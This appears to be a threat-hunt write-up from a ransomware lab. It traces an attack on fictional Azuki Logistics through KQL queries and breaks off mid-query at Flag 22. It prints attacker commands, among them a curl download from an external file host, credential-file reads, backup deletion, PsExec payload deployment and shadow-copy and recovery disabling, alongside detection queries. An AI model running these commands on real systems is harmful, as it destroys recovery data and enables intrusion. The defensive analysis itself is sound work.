# 🚨 Threat Hunt Scenario - Azuki Dead in The Water 🌊

## Executive Summary

Azuki Logistics experienced a multi-stage ransomware attack conducted by a financially motivated threat actor consistent with JADE SPIDER (SilentLynx).  
The attacker gained an initial foothold on a Windows administrative workstation, pivoted to a Linux backup server to destroy recovery infrastructure, then returned to the Windows environment to deploy ransomware at scale, inhibit all recovery mechanisms, establish persistence, and remove forensic evidence.  
The attack followed a deliberate, methodical progression aligned with real-world ransomware operations and resulted in successful encryption, confirmed by the creation of a ransom note.

**🔐 Incident Response Report** 
Incident: Azuki Logistics – Ransomware Attack (JADE SPIDER / SilentLynx)  
Date: 27 November 2025  
Prepared by: SOC Analyst  
Data Source: Microsoft Defender for Endpoint (MDE) Advanced Hunting 

## Azuki Logistics Corporate Network

<p align="center">
  <img width="480" src="https://github.com/user-attachments/assets/36568b34-1819-45fa-91bb-03901ecd51cb" />
</p>

---

## Affected Systems

- azuki-adminpc – Windows administrative workstation (primary attacker control node)  
- azuki-backupsrv (Linux) – Backup server (recovery infrastructure destroyed)  
- Multiple Windows hosts – Ransomware deployment targets  
- azuki-sl – Secondary Windows system affected by recovery inhibition  

---

###
**End of Threat Hunt Summary:**
```bash
[ External Attacker ]
        |
        |  (Phishing / initial foothold)
        v
[ azuki-adminpc ]  ← Windows admin workstation (ATTACKER CONTROL)
   IP: 10.1.0.108
        |
        |  SSH (valid creds: backup-admin)
        |  - ssh.exe backup-admin@10.1.0.189
        v
[ azuki-backupsrv ]  ← Linux backup server (RECOVERY KILLED)
        |
        |  (Discovery / recon)
        |  - ls --color=auto -la /backups/
        |  - find /backups -name *.tar.gz
        |  - cat /etc/passwd
        |  - cat /etc/crontab
        |
        |  (Tool ingress)
        |  - curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z
        |
        |  (Credential access)
        |  - cat /backups/configs/all-credentials.txt
        |
        |  (Impact / recovery destruction)
        |  - rm -rf /backups/archives
        |  - systemctl stop cron
        |  - systemctl disable cron
        |
        X  Backups unusable
        |
        |  (attacker leaves Linux)
        v
[ azuki-adminpc ]  ← attacker returns here
        |
        |  (Windows lateral movement / deployment)
        |  - PsExec64.exe used (SMB / Admin Shares)
        |  - PsExec64.exe \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
        v
[ Windows estate ]
   |-- 10.1.0.102
   |-- 10.1.0.188
   |-- 10.1.0.204
        |
        |  silentlynx.exe deployed
        v
[ RANSOMWARE EXECUTION PHASE ]
        |
        |  (PHASE 3: Recovery inhibition)
        |  - net stop VSS /y
        |  - net stop wbengine /y
        |  - taskkill /F /IM sqlservr.exe
        |  - vssadmin.exe delete shadows /all /quiet
        |  - vssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB
        |  - bcdedit /set {default} recoveryenabled No
        |  - wbadmin delete catalog -quiet
        |
        |  (PHASE 4: Persistence)
        |  - Run key: WindowsSecurityHealth
        |  - Scheduled task: Microsoft\Windows\Security\SecurityHealthService
        |
        |  (PHASE 5: Anti-forensics)
        |  - fsutil.exe usn deletejournal /D C:
        |
        |  (PHASE 6: Ransomware success)
        |  - Ransom note: SILENTLYNX_README.txt
        v
[ POST-IMPACT / LAST TELEMETRY ]
   - Last observed interaction on azuki-sl: 05/12/2025 11:46:33.527 UTC
   - First interaction: 18/11/2025, 01:39:01.221 UTC
```

---
```
## 📑 Table of Contents

- [Executive Summary](#executive-summary)
- [Azuki Logistics Corporate Network](#azuki-logistics-corporate-network)
- [Affected Systems](#affected-systems)
- [End of Threat Hunt Summary](#end-of-threat-hunt-summary)

### 🐧 Phase 1 — Linux Backup Server Compromise (Flags 1–12)
- [Flag 1 — Lateral Movement: Remote Access (SSH)](#flag-1--lateral-movement-remote-access-ssh)
- [Flag 2 — Attack Source](#flag-2--attack-source)
- [Flag 3 — Compromised Account](#flag-3--compromised-account)
- [Flag 4 — Directory Enumeration](#flag-4--directory-enumeration)
- [Flag 5 — File Search](#flag-5--file-search)
- [Flag 6 — Account Enumeration](#flag-6--account-enumeration)
- [Flag 7 — Scheduled Job Reconnaissance](#flag-7--scheduled-job-reconnaissance)
- [Flag 8 — Tool Transfer](#flag-8--tool-transfer)
- [Flag 9 — Credential Access](#flag-9--credential-access)
- [Flag 10 — Data Destruction](#flag-10--data-destruction)
- [Flag 11 — Service Stopped](#flag-11--service-stopped)
- [Flag 12 — Service Disabled](#flag-12--service-disabled)

### 💻 Phase 2 — Windows Ransomware Deployment (Flags 13–15)
- [Flag 13 — Remote Execution Tool](#flag-13--remote-execution-tool)
- [Flag 14 — Deployment Command](#flag-14--deployment-command)
- [Flag 15 — Malicious Payload](#flag-15--malicious-payload)

### 🔥 Phase 3 — Recovery Inhibition (Flags 16–22)
- [Flag 16 — Shadow Service Stopped](#flag-16--shadow-service-stopped)
- [Flag 17 — Backup Engine Stopped](#flag-17--backup-engine-stopped)
- [Flag 18 — Process Termination](#flag-18--process-termination)
- [Flag 19 — Recovery Point Deletion](#flag-19--recovery-point-deletion)
- [Flag 20 — Shadow Storage Limitation](#flag-20--shadow-storage-limitation)
- [Flag 21 — Recovery Disabled](#flag-21--recovery-disabled)
- [Flag 22 — Backup Catalog Deletion](#flag-22--backup-catalog-deletion)

### 🔒 Phase 4 — Persistence (Flags 23–24)
- [Flag 23 — Registry Autorun](#flag-23--registry-autorun)
- [Flag 24 — Scheduled Task](#flag-24--scheduled-task)

### 🧹 Phase 5 — Anti-Forensics (Flag 25)
- [Flag 25 — Journal Deletion](#flag-25--journal-deletion)

### 💀 Phase 6 — Ransomware Success (Flag 26)
- [Flag 26 — Ransom Note](#flag-26--ransom-note)

- [Last Interaction](#last-interaction)
- [Final Assessment](#4-final-assessment)
```

---

## 🐧 PHASE 1 — Linux Backup Server Compromise (Flags 1–12)

### FLAG 1 — Lateral Movement: Remote Access (SSH)

MITRE: T1021.004 – Remote Services (SSH)

Flag Format: IP address
Question: What IP address initiated the connection to the backup server?

Based on the info so far we know a device was compromised and it was then used to remote access the linux server. First I checked `DeviceProcessEvents` to identify any device name containing "azuki" run a command containing "ssh". I also filtered the search within the November month. I started on the 1st to see any earlier activity than the 27th when the attack was identified.

**KQL Used**

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where FileName in~ ("ssh.exe")
| where Timestamp between (datetime(2025-11-01) .. datetime(2025-11-29))
| project Timestamp, DeviceName, FileName, ProcessCommandLine
| order by Timestamp asc
```

<img width="740" alt="" src="https://github.com/user-attachments/assets/7367a718-6b3b-4083-aee1-5e8f8559f6f5" />

**Result**
"ssh.exe" backup-admin@10.1.0.189

*This means "Log me into the server at 10.1.0.189 as user backup-admin".*

**Findings Flag 1**
Compromised Device = "azuki-adminpc"
Linux Server Name = backup-admin
Linux Server IP = 10.1.0.189

SSH is only “successful” if ALL of these exist:

* SSH client executed ✅ (process evidence)
* TCP connection to port 22 established ✅ (network evidence)
* Follow-on Linux commands executed ✅ (post-auth activity)

So far we know a SSH command was executed, but don't know if this specific was successful (because it was the only one, this must be it).
Next phase, I will investigate the connection.

<details>
<summary>KQL breakdown</summary>
<p><b>DeviceProcessEvents</b> is used to identify process execution on endpoints; filtering <b>DeviceName contains "azuki"</b> scopes to the lab environment, <b>FileName in~ ("ssh.exe")</b> targets the SSH client execution, and the <b>Timestamp</b> range narrows to the investigation window so the first observed SSH command can be tied to subsequent activity.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step establishes initial Linux lateral movement evidence by confirming the SSH client was executed from an Azuki endpoint and capturing the full SSH command line used to target the backup server.</p>
</details>

---

### FLAG 2 — Attack Source

MITRE: T1021.004
Flag Format: IP address
Question: What IP address initiated the connection to the backup server?

**KQL Used**

Verifying whether connection was initiated at network level

```kql
DeviceNetworkEvents
| where DeviceName has "azuki-adminpc"
| where RemotePort == 22
| where Timestamp between (datetime(2025-11-25 05:34:00) .. datetime(2025-11-25 05:44:00))
| project Timestamp, DeviceName, RemoteIP, RemotePort
| order by Timestamp asc
```

A TCP session was established (or at least reached the connection stage). The OS only logs a network event when a socket is opened.

<img width="740" alt="" src="https://github.com/user-attachments/assets/60dfe525-9424-468b-8086-0a844107eff4" />

```kql
DeviceNetworkEvents
| where RemoteIP == "10.1.0.189"
| where Timestamp between (datetime(2025-11-25 05:34:00) .. datetime(2025-11-25 05:44:00))
| project Timestamp, DeviceName, LocalIP, RemoteIP, RemotePort, InitiatingProcessAccountName
| order by Timestamp asc
```

**Result** <img width="740" alt="" src="https://github.com/user-attachments/assets/7f829501-7299-4b50-9e9f-c1af6ac82255" />

**Findings Flag 2**
Device LocalIP = 10.1.0.108

Azuki-adminpc initiated the connection to the Linux Server. Its IP was identified.

<details>
<summary>KQL breakdown</summary>
<p><b>DeviceNetworkEvents</b> is used to validate network connectivity; filtering by <b>RemotePort == 22</b> targets SSH traffic, <b>DeviceName has "azuki-adminpc"</b> scopes to the suspected source host, and projecting <b>LocalIP/RemoteIP</b> confirms which internal IP initiated the SSH session to the backup server.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step corroborates SSH execution with network evidence by confirming a port 22 connection attempt and identifying the initiating device’s source IP within the environment.</p>
</details>

---

### FLAG 3 — Compromised Account

MITRE: T1078.002 – Valid Accounts
Flag Format: username
Question: What account was used to access the backup server?

**Evidence**

```
ssh.exe backup-admin@10.1.0.189
```

**Findings Flag 3**
The SSH command explicitly targeted the "backup-admin" account on the Linux backup server.

<details>
<summary>KQL breakdown</summary>
<p>This flag is supported by the SSH process command line already identified; the key term <b>backup-admin</b> in the SSH destination string indicates which valid account was used for remote access, aligning with <b>T1078.002</b> (valid account usage).</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step confirms credential abuse by extracting the user identity embedded in the SSH command line, establishing which account was used to access the Linux backup server.</p>
</details>

---

### FLAG 4 — Directory Enumeration

MITRE: T1083 – File and Directory Discovery
Flag Format: Full command line
Question: What command listed the backup directory contents?

First I need to find the Linux Server device name to identify the command run on it.

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where Timestamp between (datetime(2025-11-01) .. datetime(2025-11-29))
| summarize count() by DeviceName
| order by count_ desc
```

<img width="600" alt="" src="https://github.com/user-attachments/assets/97c9f2ca-0b1a-43a4-a832-31551bbfa80e" />

The Linux Server Device Name is "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"

Next, I will search the exact command run to view directory contents.

```kql
DeviceProcessEvents
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where ProcessCommandLine has_any ("ls", "pwd", "cd", "find", "cat")
| where Timestamp between (datetime(2025-11-25 05:34:00)..datetime(2025-11-25 05:44:00))
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

<img width="740" alt="" src="https://github.com/user-attachments/assets/db2239cc-07d6-4f5e-b19c-1b91ada715d0" />

AccountName = backup-admin

**Findings Flag 4**
The command run on the Linux Server = "ls --color=auto -la /backups/".
There are other commands run by system, the first by user backup-admin, is the one above.

<details>
<summary>KQL breakdown</summary>
<p><b>summarize count() by DeviceName</b> was used to identify the Linux backup server name present in telemetry; the second query filters <b>ProcessCommandLine</b> for common Linux discovery utilities (<b>ls/pwd/cd/find/cat</b>) during the SSH window to capture post-auth enumeration of <b>/backups</b>.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step identifies the Linux target host and confirms the attacker performed directory listing in the backups location to locate recovery material prior to destruction.</p>
</details>

---

### FLAG 5 — File Search

MITRE: T1083
Flag Format: Full command line
Question: What command searched for backup archives?

Commands used to search in Linux = "find"
Commands used to view archives in Linux: "tar", "unzip", "7z"

```kql
DeviceProcessEvents
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where ProcessCommandLine has "find"
| where ProcessCommandLine has_any (".tar", ".tar.gz", ".tgz")
| where Timestamp between (datetime(2025-11-01) .. datetime(2025-11-29))
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

<img width="740" alt="" src="https://github.com/user-attachments/assets/ad73ae38-bcc4-41a7-847c-43667ffd470c" />

**Command**

```bash
find /backups -name *.tar.gz
```

**Findings Flag 5**
The attacker searched for backup archive files prior to destruction.

<details>
<summary>KQL breakdown</summary>
<p>This query targets Linux archive discovery by requiring <b>ProcessCommandLine has "find"</b> and matching common archive extensions (<b>.tar/.tar.gz/.tgz</b>), which helps identify attacker efforts to locate compressed backup sets inside <b>/backups</b>.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step confirms pre-destruction reconnaissance by showing the attacker searched for backup archive files, consistent with identifying recovery assets before deletion.</p>
</details>

---

### FLAG 6 — Account Enumeration

MITRE: T1087.001 – Local Account Discovery
Flag Format: Full command line
Question: What command enumerated local accounts?

Command to look for "cat /etc/passwd"

```kql
DeviceProcessEvents
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where ProcessCommandLine has ("cat /etc/passwd")
| where Timestamp between (datetime(2025-11-01) .. datetime(2025-11-29))
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

**Command**

```bash
cat /etc/passwd
```

**Findings Flag 6**
Local Linux accounts were enumerated to understand system privileges.

<details>
<summary>KQL breakdown</summary>
<p>Filtering on <b>cat /etc/passwd</b> detects local account enumeration because <b>/etc/passwd</b> is a standard Linux user database; this supports account discovery activity tied to privilege and access mapping on the backup server.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step confirms the attacker enumerated local Linux accounts to understand available users and potential privilege context on the compromised backup server.</p>
</details>

---

### FLAG 7 — Scheduled Job Reconnaissance

MITRE: T1083
Flag Format: Full command line
Question: What command revealed scheduled jobs on the system?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where ProcessCommandLine has_any ("crontab", "cat /etc/crontab")
| where Timestamp between (datetime(2025-11-01) .. datetime(2025-11-29))
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

Commands to look for "crontab", "cat /etc/crontab"

<img width="740" alt="" src="https://github.com/user-attachments/assets/92ce601e-bcdd-4fbe-95e0-35b076c7617a" />

**Command**

```bash
cat /etc/crontab
```

**Findings Flag 7**
The attacker reviewed backup schedules to time destruction optimally.

<details>
<summary>KQL breakdown</summary>
<p>The key terms <b>crontab</b> and <b>cat /etc/crontab</b> indicate scheduled job review on Linux; attackers commonly inspect cron to understand automation (such as backups) and align destructive actions to maximize impact.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step shows cron schedule reconnaissance, supporting the conclusion that the attacker assessed backup timing and automation before disabling or destroying recovery mechanisms.</p>
</details>

---

### FLAG 8 — Tool Transfer

MITRE: T1105 – Ingress Tool Transfer
Flag Format: Full command line
Question: What command downloaded external tools?

Command to look for "curl", "wget".

```kql
DeviceProcessEvents
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where ProcessCommandLine has_any ("curl", "wget")
| where Timestamp between (datetime(2025-11-01) .. datetime(2025-11-29))
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

<img width="1318" height="290" alt="" src="https://github.com/user-attachments/assets/df538a2f-c4b8-45da-925e-e6c31f9abb3f" />
The first instance of a download after

**Command**

```bash
curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z
```

**Findings Flag 8**
A destructive tool was downloaded from external infrastructure.

<details>
<summary>KQL breakdown</summary>
<p>Searching for <b>curl</b> or <b>wget</b> in <b>ProcessCommandLine</b> identifies external tool transfer on Linux; these utilities are commonly used to pull attacker tooling (here, an archive) from an external URL into the environment.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step confirms ingress tool transfer by identifying a command that downloaded an external archive to the backup server, supporting preparation for destructive actions.</p>
</details>

---

### FLAG 9 — Credential Access

MITRE: T1552.001 – Credentials in Files
Flag Format: Full command line
Question: What command accessed stored credentials?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where ProcessCommandLine has_any ("cat", "less", "more")
| where ProcessCommandLine has_any ("credential", "creds", "password", "config")
| where Timestamp between (datetime(2025-11-01) .. datetime(2025-11-29))
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

<img width="1153" height="130" alt="" src="https://github.com/user-attachments/assets/d16b8278-09d5-483c-92a0-5e59dc425f35" />

**Command**

```bash
cat /backups/configs/all-credentials.txt
```

**Findings Flag 9**
Stored credentials were accessed directly from configuration files under backups directory.

<details>
<summary>KQL breakdown</summary>
<p>This query combines file viewing utilities (<b>cat/less/more</b>) with credential-related keywords (<b>credential/creds/password/config</b>) to identify likely plaintext credential access within backup configuration locations.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step demonstrates credential access via direct reading of a credentials file inside the backups directory, supporting the conclusion that sensitive recovery/configuration data was targeted.</p>
</details>

---

### FLAG 10 — Data Destruction

MITRE: T1485 – Data Destruction
Flag Format: Full command line
Question: What command destroyed backup files?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where ProcessCommandLine has_any ("rm -rf", "shred", "destroy", "7z x")
| where Timestamp between (datetime(2025-11-01) .. datetime(2025-11-29))
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

-r - recursive = deletes directories and all their contents
-f - force = skips prompts and ignores errors

<img width="1317" height="287" alt="" src="https://github.com/user-attachments/assets/6683d941-840d-4043-b0b4-16c09685bb48" />

**Command**

```bash
rm -rf /backups/archives
```

**Findings Flag 10**
Backup archives were permanently deleted, eliminating recovery options.

<details>
<summary>KQL breakdown</summary>
<p>Filtering for destructive commands (<b>rm -rf</b>, <b>shred</b>) and related tooling keywords helps locate backup deletion activity; <b>rm -rf</b> is a high-risk command because it recursively removes directories without confirmation when combined with force flags.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step confirms direct destruction of backup archives on the Linux backup server, removing a primary recovery path prior to ransomware deployment.</p>
</details>

---

### FLAG 11 — Service Stopped

MITRE: T1489 – Service Stop
Flag Format: Full command line
Question: What command stopped the backup service?

<img width="976" height="161" alt="" src="https://github.com/user-attachments/assets/57876801-96cd-49bb-97d7-3ab596dc8631" />

```kql
DeviceProcessEvents
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where ProcessCommandLine has_any ("crontab -e", "stop cron")
| where Timestamp between (datetime(2025-11-01) .. datetime(2025-11-29))
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

**Command**

```bash
systemctl stop cron
```

**Findings Flag 11**
Backup scheduling was halted temporarily.

<details>
<summary>KQL breakdown</summary>
<p>This query searches for cron service stop indicators (<b>stop cron</b>) because cron commonly schedules backups; <b>systemctl stop</b> results in immediate operational impact but does not persist across reboot unless the service is also disabled.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step confirms the attacker temporarily stopped scheduled backup execution on the Linux server, reducing the chance of new recovery artifacts being created during the attack window.</p>
</details>

---

### FLAG 12 — Service Disabled

MITRE: T1489
Flag Format: Full command line
Question: What command permanently disabled the backup service?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net"
| where ProcessCommandLine has_any ("disable cron")
| where Timestamp between (datetime(2025-11-01) .. datetime(2025-11-29))
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

<img width="1000" alt="" src="https://github.com/user-attachments/assets/96518a2f-0b1a-43a4-a832-31551bbfa80e" />

**Command**

```bash
systemctl disable cron
```

**Findings Flag 12**
Backup scheduling was permanently disabled across reboots. This was done through systemctl which manages start, stop, enable, disable, restart of services.

<details>
<summary>KQL breakdown</summary>
<p>Searching for <b>disable cron</b> identifies persistence of service disruption; unlike stopping a service, <b>systemctl disable</b> prevents the service from starting on boot, ensuring backup scheduling remains inactive after restart.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step confirms the attacker disabled cron to ensure backup scheduling did not resume after reboot, reinforcing recovery disruption as preparation for ransomware impact.</p>
</details>

---

## 💻 PHASE 2 — Windows Ransomware Deployment (Flags 13–15) - Within Windows

### FLAG 13 — Remote Execution Tool

MITRE: T1021.002 – SMB / Admin Shares
Flag Format: filename.exe
Question: What tool executed commands on remote systems?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has_any ("sc.exe", "create", "psexec", "\\\\", "ADMIN$", "C$")
| where Timestamp between (datetime(2025-11-01) .. datetime(2025-11-29))
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```

<img width="1473" height="282" alt="" src="https://github.com/user-attachments/assets/8a02a107-42b0-4cf7-a843-804c8bcf3aaa" />

**Findings Flag 13**
PsExec was used for rapid lateral movement across Windows systems.

<details>
<summary>KQL breakdown</summary>
<p><b>ProcessCommandLine</b> filters include SMB/admin share indicators (<b>\\\\</b>, <b>ADMIN$</b>, <b>C$</b>) and <b>psexec</b> references to detect remote execution over Windows admin shares; this supports identifying lateral movement tooling originating from <b>azuki-adminpc</b>.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step identifies the remote execution mechanism used to run commands on other Windows hosts, establishing the tool leveraged for lateral deployment.</p>
</details>

---

### FLAG 14 — Deployment Command

MITRE: T1021.002
Flag Format: Full command line
Question: What is the full deployment command?

**Command**

```cmd
PsExec64.exe \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe
```

**Findings Flag 14**
The attacker deployed ransomware using valid credentials over SMB. PsExec64.exe was the delivery method while the malware execution program is named silentlynx.exe.

<details>
<summary>KQL breakdown</summary>
<p>This flag relies on capturing the full PsExec command line to show remote target (<b>\\\\10.1.0.102</b>), credential usage (<b>-u</b>, <b>-p</b> redacted), and payload transfer/execution options (<b>-c</b>, <b>-f</b>), which collectively demonstrate credentialed remote execution over admin shares.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step documents the exact ransomware deployment method by preserving the complete remote execution command line, including target host, account context, and payload path.</p>
</details>

---

### FLAG 15 — Malicious Payload

MITRE: T1204.002 – User Execution
Flag Format: filename.exe
Question: What payload was deployed?

**Payload**

```
silentlynx.exe
```

**Findings Flag 15**
The deployed payload executable was identified as silentlynx.exe.

<details>
<summary>KQL breakdown</summary>
<p>This flag is validated by extracting the payload filename from the deployment evidence; tracking the specific executable name enables consistent pivoting across telemetry (process, file, registry) to link subsequent actions back to the same malware component.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step establishes the malware artifact used in the attack, allowing subsequent hunting steps to correlate recovery inhibition, persistence, and ransom note creation to the same payload family.</p>
</details>

---

## 🔥 PHASE 3 — Recovery Inhibition (Flags 16–22)

### FLAG 16 — Shadow Service Stopped

MITRE: T1490 – Inhibit System Recovery
Flag Format: Full command line
Question: What command stopped the shadow copy service?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has_any ("stop")
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-12-05))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp asc
```

<img width="1238" height="281" alt="" src="https://github.com/user-attachments/assets/e790ea8d-b6ca-4ed4-bc4f-5a1dc845b261" />

**Command**

```cmd
net stop VSS /y
```

**Findings Flag 16**
The attacker stopped the Volume Shadow Copy Service to prevent restoration using shadow copies.

<details>
<summary>KQL breakdown</summary>
<p><b>DeviceProcessEvents</b> is used because service stopping is executed via processes; searching for <b>stop</b> during the known compromise window on <b>azuki-adminpc</b> helps identify recovery-inhibition commands, with <b>VSS</b> indicating the shadow copy service targeted for disabling restore capabilities.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step confirms the attacker disabled VSS to prevent restoration from shadow copies, a common prerequisite action to maximize ransomware impact by removing built-in recovery options.</p>
</details>

---

### FLAG 17 — Backup Engine Stopped

MITRE: T1490 – Inhibit System Recovery
Flag Format: Full command line
Question: What command stopped the backup engine?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has_any ("wbengine")
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-12-05))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp asc
```

<img width="1211" height="182" alt="" src="https://github.com/user-attachments/assets/980d0a9b-d3cf-4685-805d-4ec1e69f8289" />

**Command**

```cmd
net stop wbengine /y
```

**Findings Flag 17**
The Windows Backup Engine was stopped to prevent backup operations during ransomware execution.

<details>
<summary>KQL breakdown</summary>
<p>The keyword <b>wbengine</b> identifies the Windows Backup Engine service; searching process command lines for this term is used to find actions that halt backup operations and prevent creation of new recovery points during the ransomware execution phase.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step shows targeted disruption of Windows backup functionality, reinforcing a deliberate recovery inhibition strategy prior to and during encryption.</p>
</details>

---

### FLAG 18 — Process Termination

MITRE: T1562.001 – Impair Defenses: Disable or Modify Tools
Flag Format: Full command line
Question: What command terminated processes to unlock files?

```kql
```

**Command**

```cmd
taskkill /F /IM sqlservr.exe
```

**Findings Flag 18**
Database processes were forcefully terminated to release locked files prior to encryption. Locked files can’t be encrypted.

sqlservr.exe = Microsoft SQL Server engine
It keeps database files open in memory.

While running, Windows places locks on (therefore had to be terminated):
.mdf (main database)
.ndf (secondary data)
.ldf (transaction logs)

<details>
<summary>KQL breakdown</summary>
<p>This activity is typically found in <b>DeviceProcessEvents</b> by searching for <b>taskkill</b>, <b>/F</b>, and targeted process names (here <b>sqlservr.exe</b>); ransomware commonly terminates locking services to ensure files can be accessed for encryption without application-level locks blocking modifications.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step confirms a pre-encryption preparation action where a file-locking service was forcibly terminated to enable successful encryption of database-related files.</p>
</details>

---

### FLAG 19 — Recovery Point Deletion

MITRE: T1490 – Inhibit System Recovery
Flag Format: Full command line
Question: What command deleted recovery points?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has_any ("vssadmin","shadows")
| where ProcessCommandLine has "delete" //searching for delete specific
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-12-05))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp asc
```

<img width="1331" height="157" alt="" src="https://github.com/user-attachments/assets/fb2cdc9b-b7e0-4a55-8a95-dde0f2ee903c" />

**Command**

```cmd
vssadmin.exe delete shadows /all /quiet
```

**Findings Flag 19**
All shadow copies were deleted silently to eliminate recovery options.

<details>
<summary>KQL breakdown</summary>
<p>Filtering for <b>vssadmin</b> and <b>shadows</b> targets the built-in shadow copy management utility, and requiring <b>delete</b> isolates destructive actions; this combination is used to find explicit removal of restore snapshots, which directly supports <b>T1490</b> recovery inhibition.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step demonstrates the attacker removed existing restore snapshots to prevent rapid rollback of encrypted files, a standard ransomware technique to increase operational impact.</p>
</details>

---

### FLAG 20 — Shadow Storage Limitation

MITRE: T1490 – Inhibit System Recovery
Flag Format: Full command line
Question: What command limited recovery storage?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has_any ("shadow","storage","resize")
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-12-05))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp asc
```

<img width="1507" height="283" alt="" src="https://github.com/user-attachments/assets/c4ec3811-10cc-4bcd-817f-bbf922e39a50" />

**Command**

```cmd
vssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB
```

**Findings Flag 20**
Shadow storage was reduced to prevent new restore points from being created.

<details>
<summary>KQL breakdown</summary>
<p>The keywords <b>shadow</b>, <b>storage</b>, and <b>resize</b> are used to identify capacity manipulation of VSS storage; limiting shadow storage prevents creation of future restore points even if VSS is restarted, reinforcing recovery inhibition beyond snapshot deletion.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step confirms the attacker prevented future snapshot creation by shrinking allocated shadow copy storage, ensuring recovery options remain constrained after the initial destructive actions.</p>
</details>

---

### FLAG 21 — Recovery Disabled

MITRE: T1490 – Inhibit System Recovery
Flag Format: Full command line
Question: What command disabled system recovery?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
| where ProcessCommandLine has_any ("bcdedit")
| where Timestamp between (datetime(2025-11-19) .. datetime(2025-12-05))
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp asc
```

<img width="1606" height="148" alt="" src="https://github.com/user-attachments/assets/e07a580f-69bb-4576-a8c2-4b713fb1d3bc" />

**Command**

```cmd
bcdedit /set {default} recoveryenabled No
```

**Findings Flag 21**
Windows automatic recovery functionality was disabled to prevent system restoration.

<details>
<summary>KQL breakdown</summary>
<p><b>bcdedit</b> is the Windows boot configuration editor; searching for it in process command lines identifies boot-level recovery changes that persist across reboot, making it a high-signal indicator for deliberate system recovery disabling within a ransomware chain.</p>
</details>

<details>
<summary>Flag summary</summary>
<p>This step confirms recovery was disabled at the boot configuration level, reducing the ability to use automatic repair features after ransomware-related system disruption.</p>
</details>

---

### FLAG 22 — Backup Catalog Deletion

MITRE: T1490 – Inhibit System Recovery
Flag Format: Full command line
Question: What command deleted the backup catalogue?

```kql
DeviceProcessEvents
| where DeviceName == "azuki-adminpc"
